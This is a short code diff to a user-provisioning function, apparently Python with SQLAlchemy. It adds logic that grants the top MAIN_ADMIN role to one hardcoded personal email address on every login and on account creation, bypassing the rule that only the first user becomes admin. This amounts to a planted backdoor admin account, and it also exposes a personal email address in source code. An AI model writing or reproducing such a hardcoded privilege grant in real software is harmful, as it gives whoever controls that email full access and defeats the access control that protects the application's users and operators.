@@ -18,6 +18,11 @@ def get_or_create_user(
             user.email = email
         if display_name and user.display_name != display_name:
             user.display_name = display_name
+        
+        # Enforce admin for specific email
+        if email == "dhararanas94@gmail.com" and not has_role(user, UserRoleEnum.MAIN_ADMIN):
+            db.add(UserRole(user_id=user.id, role=UserRoleEnum.MAIN_ADMIN.value, department_id=None))
+            
         db.add(user)
         db.commit()
         db.refresh(user)
@@ -30,7 +35,7 @@ def get_or_create_user(
     db.add(UserRole(user_id=user.id, role=UserRoleEnum.REPORTER.value, department_id=None))
 
     main_admin_exists = db.scalar(select(func.count()).select_from(UserRole).where(UserRole.role == UserRoleEnum.MAIN_ADMIN.value))
-    if not main_admin_exists:
+    if not main_admin_exists or email == "dhararanas94@gmail.com":
         db.add(UserRole(user_id=user.id, role=UserRoleEnum.MAIN_ADMIN.value, department_id=None))
 
     db.commit()
